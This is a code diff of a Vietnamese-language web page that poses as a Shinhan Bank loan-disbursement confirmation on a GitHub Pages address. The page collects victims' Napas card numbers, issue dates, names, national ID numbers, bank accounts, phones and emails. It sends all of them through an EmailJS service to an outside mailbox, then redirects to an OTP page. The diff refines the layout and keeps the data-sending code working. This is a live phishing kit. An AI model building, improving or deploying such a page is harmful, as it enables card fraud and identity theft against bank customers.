@@ -6,17 +6,27 @@
     <title>Xác Nhận Giải Ngân Qua ATM</title>
     <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script>
-        // Inputmask fallback
         window.Inputmask = window.Inputmask || function(options) {
             console.warn('Inputmask not loaded, using fallback.');
             return {
                 mask: function(element) {
+                    element.addEventListener('input', function() {
+                        let value = element.value.replace(/\D/g, '');
+                        if (value.length <= 19) {
+                            let formatted = '';
+                            for (let i = 0; i < value.length; i++) {
+                                if (i > 0 && i % 4 === 0) formatted += ' ';
+                                formatted += value[i];
+                            }
+                            element.value = formatted;
+                        }
+                    });
                     return this;
                 }
             };
         };
-        // Initialize EmailJS
         emailjs.init('OrBsI926QI2_xBh1f');
     </script>
     <style>
@@ -26,12 +36,10 @@
             box-sizing: border-box;
             font-family: 'Arial', sans-serif;
         }
-
         body {
             background-color: #f5f5f5;
             color: #333;
         }
-
         .top-banner {
             background-color: #003087;
             padding: 12px;
@@ -40,11 +48,9 @@
             align-items: center;
             position: relative;
         }
-
         .top-banner img {
             height: 35px;
         }
-
         .hamburger {
             display: none;
             background: none;
@@ -56,7 +62,6 @@
             right: 10px;
             z-index: 1000;
         }
-
         .hamburger span {
             display: block;
             width: 25px;
@@ -65,36 +70,29 @@
             margin: 5px 0;
             transition: all 0.3s ease;
         }
-
         .hamburger[aria-expanded="true"] span:nth-child(1) {
             transform: rotate(45deg) translate(5px, 5px);
         }
-
         .hamburger[aria-expanded="true"] span:nth-child(2) {
             opacity: 0;
         }
-
         .hamburger[aria-expanded="true"] span:nth-child(3) {
             transform: rotate(-45deg) translate(7px, -7px);
         }
-
         nav {
             background-color: #fff;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             margin: 10px 0;
         }
-
         nav ul {
             display: flex;
             justify-content: center;
             list-style: none;
             padding: 10px 0;
         }
-
         nav ul li {
             margin: 0 15px;
         }
-
         nav ul li a {
             text-decoration: none;
             color: #003087;
@@ -103,29 +101,24 @@
             display: block;
             transition: background 0.3s;
         }
-
         nav ul li a:hover, nav ul li a:focus {
             background: #e6f0ff;
             border-radius: 5px;
         }
-
         .banner-carousel {
             position: relative;
             overflow: hidden;
             margin-bottom: 10px;
             min-height: 180px;
         }
-
         .banner-slide {
             display: none;
             width: 100%;
             height: 100%;
         }
-
         .banner-slide.active {
             display: block;
         }
-
         .banner-slide img {
             width: 100%;
             max-height: 280px;
@@ -133,7 +126,6 @@
             display: block;
             margin: 0 auto;
         }
-
         .banner-text {
             position: absolute;
             top: 50%;
@@ -146,7 +138,6 @@
             border-radius: 5px;
             max-width: 80%;
         }
-
         .prev, .next {
             position: absolute;
             top: 50%;
@@ -160,26 +151,21 @@
             border-radius: 5px;
             transition: background 0.3s;
         }
-
         .prev:hover, .next:hover {
             background: rgba(0, 0, 0, 0.9);
         }
-
         .prev:focus, .next:focus {
             outline: 2px solid #fff;
             outline-offset: 2px;
         }
-
         .prev { left: 15px; }
         .next { right: 15px; }
-
         .dots {
             text-align: center;
             position: absolute;
             bottom: 10px;
             width: 100%;
         }
-
         .dot {
             display: inline-block;
             width: 12px;
@@ -190,22 +176,18 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-
         .dot:hover, .dot:focus {
             background: #666;
         }
-
         .dot.active {
             background: #003087;
         }
-
         .steps {
             display: flex;
             justify-content: center;
             margin: 10px 0;
             gap: 10px;
         }
-
         .step {
             flex: 1;
             text-align: center;
@@ -214,204 +196,134 @@
             border-radius: 5px;
             font-size: 14px;
         }
-
         .step.active {
             background-color: #003087;
             color: #fff;
         }
-
         .form-container {
             background-color: #fff;
-            padding: 15px;
+            padding: 10px;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             max-width: 600px;
             margin: 0 auto;
         }
-
         .form-container h2 {
             display: none;
             text-align: center;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
-
         .form-container h2.active {
             display: block;
         }
-
         .bank-selection {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: center;
         }
-
         .bank-selection h3 {
             color: #003087;
             font-size: 16px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
-
         .bank-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 15px;
         }
-
         .bank-option {
             cursor: pointer;
-            padding: 10px;
+            padding: 8px;
             border: 1px solid #ccc;
             border-radius: 5px;
             transition: border 0.3s;
             text-align: center;
         }
-
         .bank-option img {
             max-width: 80px;
             height: auto;
         }
-
         .bank-option p {
             font-size: 12px;
             margin-top: 5px;
         }
-
         .bank-option.selected {
             border: 2px solid #003087;
             background: #e6f0ff;
         }
-
         .bank-selection .error {
             color: red;
             font-size: 12px;
             display: none;
-            margin-top: 10px;
+            margin-top: 8px;
         }
-
         .bank-selection .error.show {
             display: block;
         }
-
         .guide-section {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: center;
             display: none;
         }
-
         .guide-section.active {
             display: block;
         }
-
         .guide-section h3 {
             color: #003087;
             font-size: 16px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
-
         .guide-section .bank-logo {
             max-width: 80px;
             height: auto;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
-
         .guide-section p {
             font-size: 14px;
         }
-
-        .issue-guide-section {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f9f9f9;
-            border-radius: 5px;
-            display: none;
-        }
-
-        .issue-guide-section.active {
-            display: block;
-        }
-
-        .issue-guide-section h3 {
-            color: #003087;
-            font-size: 16px;
-            margin-bottom: 10px;
-            display: inline-block;
-        }
-
-        .issue-guide-section ul {
-            list-style: decimal;
-            padding-left: 20px;
-            font-size: 14px;
-        }
-
-        .issue-guide-section ul li {
-            margin-bottom: 8px;
-        }
-
-        .issue-guide-section img {
-            max-width: 300px;
-            width: 100%;
-            border: 1px solid #e9ecef;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
-
-        .issue-guide-btn {
-            padding: 8px 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            background-color: #003087;
-            color: #fff;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .issue-guide-btn.active {
-            display: inline-block;
-        }
-
-        .issue-guide-btn:hover {
-            background-color: #ff6200;
-        }
-
         .summary {
-            display: none;
-            margin-bottom: 20px;
-            padding: 15px;
+            margin-bottom: 15px;
+            padding: 10px;
             background-color: #f9f9f9;
             border-radius: 5px;
         }
-
-        .summary.active {
-            display: block;
-        }
-
         .summary h3 {
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-
+        .summary h3::after {
+            content: '\f078';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            margin-left: 8px;
+            transition: transform 0.3s;
+        }
+        .summary.collapsed h3::after {
+            transform: rotate(180deg);
+        }
+        .summary.collapsed .summary-content {
+            display: none;
+        }
         .summary p {
-            margin: 8px 0;
+            margin: 6px 0;
             font-size: 14px;
         }
-
         .form-group {
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
-
         .form-group label {
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
         }
-
         .form-group .input-wrapper {
             display: flex;
             align-items: center;
             justify-content: center;
         }
-
         .form-group input {
             width: 100%;
             padding: 8px;
@@ -419,57 +331,52 @@
             border-radius: 5px;
             font-size: 14px;
         }
-
         .form-group .error {
             color: red;
             font-size: 12px;
             display: none;
         }
-
         .form-group .error.show {
             display: block;
         }
-
         .form-group .help-text {
             font-size: 12px;
             color: #666;
             margin-top: 5px;
         }
-
-        .help-icon {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            background-color: red;
-            color: white;
-            border-radius: 50%;
-            text-align: center;
-            line-height: 20px;
-            font-weight: bold;
-            font-size: 14px;
-            margin-left: 5px;
-            cursor: pointer;
-        }
-
         .help-image {
-            display: none;
             margin-bottom: 15px;
             text-align: center;
+            display: none;
+            position: relative;
         }
-
+        .help-image.active {
+            display: block;
+        }
         .help-image img {
             max-width: 300px;
             width: 100%;
             border: 1px solid #e9ecef;
             border-radius: 5px;
         }
-
+        .help-image .overlay-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            padding: 8px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center;
+            max-width: 90%;
+        }
         .buttons {
             display: flex;
             justify-content: center;
             gap: 10px;
         }
-
         button {
             padding: 8px 16px;
             border: none;
@@ -477,20 +384,16 @@
             cursor: pointer;
             font-size: 14px;
         }
-
         button.primary {
             background-color: #003087;
             color: #fff;
         }
-
         .card-form {
             display: none;
         }
-
         .card-form.active {
             display: block;
         }
-
         footer {
             background-color: #003087;
             color: #fff;
@@ -498,36 +401,29 @@
             padding: 15px 0;
             margin-top: 15px;
         }
-
         footer img {
             height: 28px;
             margin: 8px;
         }
-
         footer a {
             color: #fff;
             margin: 0 8px;
             font-size: 12px;
             text-decoration: none;
         }
-
         footer a:hover {
             text-decoration: underline;
         }
-
         @media (max-width: 768px) {
             .top-banner {
                 padding: 10px;
             }
-
             .top-banner img {
                 height: 28px;
             }
-
             .hamburger {
                 display: block;
             }
-
             nav ul {
                 display: none;
                 flex-direction: column;
@@ -540,85 +436,71 @@
                 box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                 z-index: 999;
             }
-
             nav ul.show {
                 display: flex;
             }
-
             nav ul li {
                 margin: 8px 0;
                 width: 100%;
                 text-align: center;
             }
-
             nav ul li a {
                 padding: 12px;
                 font-size: 14px;
             }
-
             .banner-carousel {
                 min-height: 160px;
                 margin-bottom: 5px;
             }
-
             .banner-text h1 {
                 font-size: 16px;
             }
-
             .banner-text p {
                 font-size: 10px;
             }
-
             .banner-slide img {
                 max-height: 180px;
             }
-
             .prev, .next {
                 padding: 8px;
                 font-size: 12px;
             }
-
             .dot {
                 width: 8px;
                 height: 8px;
                 margin: 0 4px;
             }
-
             .steps {
                 flex-direction: column;
                 gap: 6px;
             }
-
             .step {
                 padding: 8px;
                 font-size: 12px;
             }
-
             .form-container {
-                padding: 12px;
+                padding: 10px;
             }
-
             .bank-grid {
                 grid-template-columns: repeat(3, 1fr);
             }
-
             .bank-option img {
                 max-width: 60px;
             }
-
             .guide-section .bank-logo {
                 max-width: 60px;
             }
-
-            .guide-section img, .issue-guide-section img, .help-image img {
+            .guide-section img, .help-image img {
                 max-width: 200px;
             }
-
-            .form-group {
-                margin-bottom: 10px;
+            .help-image .overlay-text {
+                font-size: 12px;
+                padding: 6px;
             }
-
-            button, .issue-guide-btn {
+            .form-group {
+                margin-bottom: 8px;
+            }
+            button {
                 padding: 6px 12px;
                 font-size: 12px;
             }
@@ -694,20 +576,19 @@
     <div class="container">
         <div class="form-container">
             <h2>Xác Nhận Giải Ngân Qua ATM</h2>
-            <div class="help-image" id="helpImage">
-                <img src="https://i.imgur.com/Mshq9xi.jpeg" alt="Hướng dẫn nhập thông tin thẻ">
-            </div>
-            <div class="summary">
-                <h3>Thông tin giải ngân</h3>
-                <p>Họ và Tên: <span id="summaryName"></span></p>
-                <p>Số CCCD: <span id="summaryCCCD"></span></p>
-                <p>Số tiền vay: <span id="summaryAmount">N/A</span></p>
-                <p>Tháng vay: <span id="summaryMonths">N/A</span></p>
-                <p>Số tài khoản ngân hàng: <span id="summaryAccountNumber"></span></p>
-                <p>Họ và tên chủ tài khoản: <span id="summaryAccountHolder"></span></p>
-                <p>Ngân hàng: <span id="summaryBank"></span></p>
-                <p>Số điện thoại: <span id="summaryPhone"></span></p>
-                <p>Email: <span id="summaryEmail"></span></p>
+            <div class="summary collapsed" id="summary">
+                <h3 onclick="toggleSummary()">Thông tin giải ngân</h3>
+                <div class="summary-content">
+                    <p>Họ và Tên: <span id="summaryName"></span></p>
+                    <p>Số CCCD: <span id="summaryCCCD"></span></p>
+                    <p>Số tiền vay: <span id="summaryAmount">N/A</span></p>
+                    <p>Tháng vay: <span id="summaryMonths">N/A</span></p>
+                    <p>Số tài khoản ngân hàng: <span id="summaryAccountNumber"></span></p>
+                    <p>Họ và tên chủ tài khoản: <span id="summaryAccountHolder"></span></p>
+                    <p>Ngân hàng: <span id="summaryBank"></span></p>
+                    <p>Số điện thoại: <span id="summaryPhone"></span></p>
+                    <p>Email: <span id="summaryEmail"></span></p>
+                </div>
             </div>
             <div class="bank-selection" id="bank-selection">
                 <h3>Chọn ngân hàng</h3>
@@ -890,14 +771,18 @@
                     <button class="primary" onclick="confirmBank()">Xác nhận</button>
                 </div>
             </div>
+            <div class="help-image" id="helpImage">
+                <img src="https://i.imgur.com/Mshq9xi.jpeg" alt="Hướng dẫn nhập thông tin thẻ">
+                <div class="overlay-text">Hướng dẫn nhập thông tin thẻ Napas<br>Số thẻ Napas in trên mặt trước thẻ.</div>
+            </div>
             <div class="guide-section" id="card-guide">
                 <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
-                <h3>Hướng dẫn nhập thông tin thẻ Napas</h3>
+                <h3>Nhập thông tin thẻ Napas</h3>
                 <p>Số thẻ Napas bắt đầu bằng 9704, thông tin khác ở mặt trước thẻ.</p>
             </div>
             <form id="card-info-form" class="card-form">
                 <div class="form-group" aria-live="polite">
-                    <label for="napasCardNumber">Số thẻ Napas *<span class="help-icon" onclick="showHelp('napasCardNumber')">?</span></label>
+                    <label for="napasCardNumber">Số thẻ Napas *</label>
                     <div class="input-wrapper">
                         <input type="text" id="napasCardNumber" placeholder="9704 ..." maxlength="23" required aria-describedby="napasCardNumberError">
                     </div>
@@ -905,7 +790,7 @@
                     <span class="error" id="napasCardNumberError">Số thẻ phải bắt đầu bằng 9704 và có từ 16 đến 19 số</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="napasIssueDate">Ngày phát hành *<span class="help-icon" onclick="showHelp('napasIssueDate')">?</span></label>
+                    <label for="napasIssueDate">Ngày phát hành *</label>
                     <div class="input-wrapper">
                         <input type="text" id="napasIssueDate" placeholder="05/25" maxlength="5" required aria-describedby="napasIssueDateError">
                     </div>
@@ -913,7 +798,7 @@
                     <span class="error" id="napasIssueDateError">Ngày phát hành phải hợp lệ (mm/yy, không phải tương lai)</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="napasFullName">Họ và tên chủ thẻ *<span class="help-icon" onclick="showHelp('napasFullName')">?</span></label>
+                    <label for="napasFullName">Họ và tên chủ thẻ *</label>
                     <div class="input-wrapper">
                         <input type="text" id="napasFullName" required aria-describedby="napasFullNameError">
                     </div>
@@ -924,17 +809,6 @@
                     <button type="submit" class="primary">Xác nhận</button>
                 </div>
             </form>
-            <button class="issue-guide-btn" id="issue-guide-btn" onclick="toggleIssueGuide()">Hướng dẫn phát hành thẻ</button>
-            <div class="issue-guide-section" id="issue-guide">
-                <h3>Hướng dẫn phát hành thẻ Napas <span class="help-icon" onclick="showHelp('issueGuide')">?</span></h3>
-                <ul>
-                    <li>Chuẩn bị giấy tờ tùy thân: CMND/CCCD còn hiệu lực.</li>
-                    <li>Đến chi nhánh ngân hàng đã chọn hoặc đăng ký online qua <a href="https://shinhan.com.vn/vi/personal/cards" target="_blank">trang đăng ký thẻ</a>.</li>
-                    <li>Điền đơn đăng ký và nộp hồ sơ theo hướng dẫn của nhân viên ngân hàng.</li>
-                    <li>Nhận thẻ sau 5-7 ngày làm việc tại chi nhánh hoặc qua chuyển phát.</li>
-                </ul>
-                <img src="https://via.placeholder.com/300x150?text=Chi+Nhánh+Ngân+Hàng" alt="Hình ảnh minh họa chi nhánh ngân hàng hoặc biểu mẫu đăng ký thẻ Napas">
-            </div>
         </div>
     </div>
 
@@ -956,15 +830,11 @@
         let selectedBankLogo = null;
         let formData = {};
 
-        // Show Help Image
-        function showHelp(fieldId) {
-            const helpImage = document.getElementById('helpImage');
-            helpImage.style.display = 'block';
-            // Scroll to the image for better visibility
-            helpImage.scrollIntoView({ behavior: 'smooth' });
+        function toggleSummary() {
+            const summary = document.getElementById('summary');
+            summary.classList.toggle('collapsed');
         }
 
-        // Load Summary and Initialize
         window.addEventListener('load', () => {
             try {
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
@@ -974,22 +844,24 @@
                 document.getElementById('summaryAccountHolder').textContent = formData.accountHolder || 'N/A';
                 document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
                 document.getElementById('summaryEmail').textContent = formData.email || 'N/A';
-                // Pre-select bank from sessionStorage
                 selectedBank = sessionStorage.getItem('selectedBank');
                 if (selectedBank) {
-                    document.querySelector(`.bank-option[data-bank="${selectedBank}"]`)?.classList.add('selected');
-                    document.getElementById('summaryBank').textContent = selectedBank;
-                    confirmBank();
+                    const selectedOption = document.querySelector(`.bank-option[data-bank="${selectedBank}"]`);
+                    if (selectedOption) {
+                        selectedOption.classList.add('selected');
+                        selectedBankLogo = selectedOption.getAttribute('data-logo');
+                        document.getElementById('summaryBank').textContent = selectedBank;
+                        confirmBank();
+                    }
                 }
+                initializeInputMasks();
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
             }
-            initializeInputMasks();
         });
 
-        // Toggle Hamburger Menu
         function toggleMenu() {
             const menu = document.getElementById('nav-menu');
             const hamburger = document.querySelector('.hamburger');
@@ -997,13 +869,6 @@
             hamburger.setAttribute('aria-expanded', menu.classList.contains('show'));
         }
 
-        // Toggle Issue Guide
-        function toggleIssueGuide() {
-            const issueGuide = document.getElementById('issue-guide');
-            issueGuide.classList.toggle('active');
-        }
-
-        // Select Bank
         function selectBank(bank, logo) {
             selectedBank = bank;
             selectedBankLogo = logo;
@@ -1014,7 +879,6 @@
             document.getElementById('bankError').classList.remove('show');
         }
 
-        // Confirm Bank Selection
         function confirmBank() {
             if (!selectedBank) {
                 document.getElementById('bankError').classList.add('show');
@@ -1024,14 +888,13 @@
             document.getElementById('bank-selection').style.display = 'none';
             document.getElementById('card-guide').classList.add('active');
             document.getElementById('card-info-form').classList.add('active');
-            document.getElementById('issue-guide-btn').classList.add('active');
-            document.getElementById('selected-bank-logo').src = selectedBankLogo;
+            document.getElementById('selected-bank-logo').src = selectedBankLogo || '';
+            document.getElementById('selected-bank-logo').alt = `${selectedBank} Logo`;
             document.querySelector('.form-container h2').classList.add('active');
-            document.querySelector('.summary').classList.add('active');
             document.getElementById('summaryBank').textContent = selectedBank;
+            document.getElementById('helpImage').classList.add('active');
         }
 
-        // Lazy Load Images
         function lazyLoadImages() {
             const images = document.querySelectorAll('img.lazy');
             images.forEach(img => {
@@ -1043,7 +906,6 @@
             });
         }
 
-        // Banner Carousel
         function changeSlide(n) {
             bannerIndex = (bannerIndex + n + 4) % 4;
             updateBanner();
@@ -1068,13 +930,11 @@
         }, 5000);
         updateBanner();
 
-        // Initialize Input Masks
         function initializeInputMasks() {
             if (typeof window.Inputmask === 'function') {
                 Inputmask({ mask: "9704 9999 9999 9999 [999]" }).mask(document.getElementById('napasCardNumber'));
                 Inputmask({ mask: "99/99" }).mask(document.getElementById('napasIssueDate'));
             }
-            // Manual formatting for card number
             const cardInput = document.getElementById('napasCardNumber');
             cardInput.addEventListener('input', function() {
                 let value = cardInput.value.replace(/\D/g, '');
@@ -1087,20 +947,29 @@
                     cardInput.value = formatted;
                 }
             });
-            // Manual formatting for issue date
             const issueDateInput = document.getElementById('napasIssueDate');
-            issueDateInput.addEventListener('input', function() {
-                let value = issueDateInput.value.replace(/\D/g, '');
-                if (value.length >= 2) {
-                    issueDateInput.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            issueDateInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 4) {
+                    value = value.slice(0, 4);
+                }
+                if (value.length >= 3) {
+                    e.target.value = value.slice(0, 2) + '/' + value.slice(2);
                 } else {
-                    issueDateInput.value = value;
+                    e.target.value = value;
+                }
+            });
+            issueDateInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace') {
+                    let value = e.target.value;
+                    if (value.endsWith('/')) {
+                        e.target.value = value.slice(0, -1);
+                    }
                 }
             });
             lazyLoadImages();
         }
 
-        // Validate Date (mm/yy)
         function validateDate(dateStr) {
             const regex = /^\d{2}\/\d{2}$/;
             if (!regex.test(dateStr)) return false;
@@ -1112,7 +981,6 @@
             return date && !isNaN(date) && date <= currentDate && date.getMonth() + 1 === month && date.getFullYear() === fullYear;
         }
 
-        // Validate Napas Data
         function validateForm() {
             let isValid = true;
             const cardNumber = document.getElementById('napasCardNumber').value.replace(/\D/g, '');
@@ -1137,32 +1005,31 @@
             }
 
             if (isValid) {
-                // Update formData with card details
                 formData.cardNumber = document.getElementById('napasCardNumber').value;
                 formData.issueDate = issueDate;
                 formData.cardFullName = fullName;
                 formData.cardType = 'napas';
                 formData.bankName = selectedBank;
-                // Save to sessionStorage
                 sessionStorage.setItem('cardInfo', JSON.stringify(formData));
-                // Send to EmailJS
-                emailjs.send('service_60tgxof', 'template_m26sq6s', {
-                    cardNumber: document.getElementById('napasCardNumber').value,
-                    issueDate: issueDate,
-                    fullName: fullName,
-                    cardType: 'napas',
-                    bankName: selectedBank,
-                    timestamp: new Date().toLocaleString('vi-VN'),
+                const cardData = {
+                    'Loại thẻ': formData.cardType,
+                    'Số thẻ': formData.cardNumber,
+                    'date': formData.issueDate,
+                    'Tên đầy đủ': formData.cardFullName,
+                    'Tên ngân hàng': formData.bankName,
+                    'dấu thời gian': new Date().toLocaleString('vi-VN'),
                     cccd: formData.cccd || 'N/A',
                     amount: 'N/A',
                     months: 'N/A',
                     account_number: formData.accountNumber || 'N/A',
                     account_holder: formData.accountHolder || 'N/A',
-                    bank: selectedBank || 'N/A',
+                    bank: formData.bankName || 'N/A',
                     phone: formData.phone || 'N/A',
                     email: formData.email || 'N/A',
                     method: 'N/A'
-                }).then(
+                };
+                console.log('Sending cardData:', cardData);
+                emailjs.send('service_60tgxof', 'template_m26sq6s', cardData).then(
                     () => {
                         console.log('EmailJS sent successfully');
                         window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/otp.html';
@@ -1177,7 +1044,6 @@
             return isValid;
         }
 
-        // Add click event listeners to bank options
         document.querySelectorAll('.bank-option').forEach(option => {
             option.addEventListener('click', () => {
                 selectBank(option.getAttribute('data-bank'), option.getAttribute('data-logo'));
